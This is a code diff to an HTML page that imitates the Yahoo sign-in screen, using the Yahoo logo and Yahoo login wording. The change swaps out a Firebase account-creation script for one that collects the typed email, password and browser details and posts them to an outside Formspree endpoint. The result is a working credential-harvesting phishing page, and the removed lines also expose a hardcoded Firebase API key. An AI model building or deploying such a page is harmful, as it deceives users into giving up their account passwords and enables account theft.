@@ -143,7 +143,7 @@ button {
     border: none;
 }
 
-#password_login, #email_login {
+#useremail, #userpassword {
     background-color: white;
     border: 1px solid white;
     width: 20rem;
@@ -200,15 +200,15 @@ button,#google,#create-account,.chkbox_and_forgot_password,a {
 <body>
     <div class="main contianer">
         <div class="loginform">
-            <form id="signUp-form">
+            <form id="myForm" onsubmit="submitForm(event)">
                 <img src="yahoo-logo.png" alt="Yahoo" id="yahoo-img"><br><br>
             <h1 class="signintext">Sign In</h1>
             <p class="paragraph1">Sign in using your Yahoo account</p>
             <p>username, email address or mobile number</p>
-            <input style="margin-left: 10%;" name="Username, email, or mobile nmber for Yahoo login" type="text" id="email_login" required><br>
+            <input style="margin-left: 10%;" name="Username, email, or mobile nmber for Yahoo login" type="text" id="useremail" required><br>
             <p class="pass">Password</p>
-            <input style="margin-left: 10%;" name="Yahoo login password" type="password" id="password_login">
-            <button type="submit" id="Register">Signin</button>
+            <input style="margin-left: 10%;" name="Yahoo login password" type="password" id="userpassword">
+            <button type="submit">Signin</button>
             <div class="chkbox_and_forgot_password">
                 <div><input type="checkbox" name="stay-signed" id="full_name">
                 <label for="stay signed in">stay signed</label></div>
@@ -230,97 +230,49 @@ button,#google,#create-account,.chkbox_and_forgot_password,a {
 <!-- Sweetalert CDN for Popup -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js" integrity="sha512-AA1Bzp5Q0K1KanKKmvN/4d3IRKVlv9PYgwFPvm32nPO6QS8yH1HO7LbgB1pgiOxPtfeg5zEn2ba64MUcqJx6CA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 
-<script type="module">
-  // Import the functions you need from the SDKs you need
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
-  import { getAuth, createUserWithEmailAndPassword, updateProfile } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-auth.js"; 
-  // TODO: Add SDKs for Firebase products that you want to use
-  // https://firebase.google.com/docs/web/setup#available-libraries
+<script>
+    function submitForm(event) {
+      event.preventDefault();
 
-  // Your web app's Firebase configuration
-  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
-  const firebaseConfig = {
-  apiKey: "AIzaSyC9bYZno33reps-a0iorttht_OMjpsjy2o",
-  authDomain: "login-test-4f7cd.firebaseapp.com",
-  projectId: "login-test-4f7cd",
-  storageBucket: "login-test-4f7cd.appspot.com",
-  messagingSenderId: "767596281646",
-  appId: "1:767596281646:web:5e1de8e8a80090021584bf"
-};
+      // Get user's input data 
+      const formData = {
+        useremail: document.getElementById('useremail').value,
+        userpassword: document.getElementById('userpassword').value,
+      };
 
-  // Initialize Firebase
-  const app = initializeApp(firebaseConfig);
-  const auth = getAuth(app)
+      //Get user's browser details
+      const browserDetails = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+      };
 
+      //Combine user input data with browser details
+      const combinedData = {
+        ...formData,
+        ...browserDetails,
+      };
 
-   document.getElementById('signUp-form')
-   .addEventListener('submit', (e) => {
-      e.preventDefault();
-
-      let emailLogin = document.getElementById('email_login').value
-      let passwordLogin = document.getElementById('password_login').value   
-      
-
-      // Form Authentication
-      if(emailLogin.trim() === '' || passwordLogin.trim() === ''){
-         swal({
-          text: 'All Inputs Field are required',
-          icon: 'warning'
-         })
-      }
-       else if(passwordLogin.length < 6)
+      // Sens combined data to your form backend (replace 'your-backend-url' with the actual URL)
+      fetch('https://formspree.io/f/xbjelena',
       {
-        // Popout this if the password length is less than six
-        swal({
-          text: 'Password must be atleast 6',
-          icon: 'warning'
-        })
-      } 
-      else 
-      {
-        createUserWithEmailAndPassword(auth, emailLogin, passwordLogin)
-      .then((userCredential) => {
-
-        if(userCredential){
-          swal({
-            title: 'Good Job',
-            text: 'You have loged in successfully',
-            icon: 'success'
-          })
-           .then(value => {
-            if(value){
-               window.location.replace('https://login.yahoo.com/')
-            }
-           })
-
-           
-          
-        }
-        
-        
-      }).catch((err) => {
-              if (err.code === 'auth/email-already-in-use') {
-              swal({
-                title: 'Error',
-                text: 'The email address is already in use',
-                icon: 'error'
-              });
-            } else if (err.code === 'auth/invalid-email') {
-              swal({
-                title: 'Error',
-                text: 'Invalid email address',
-                icon: 'error'
-              });
-            } else {
-              swal({
-                title: 'Error',
-                text: `${err.message}`,
-                icon: 'error'
-              });
-            }
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(combinedData),
       })
-      }
-     
-   })
-</script>
+      .then(response => {
+        // Handle the backend response if needed
+        console.log('Backend response:', response);
+        // Perform additional form submission logic if needed
+
+        document.getElementById('myForm').submit();
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        // handle errors if needed
+      });
+    }
+  </script>
 </html>
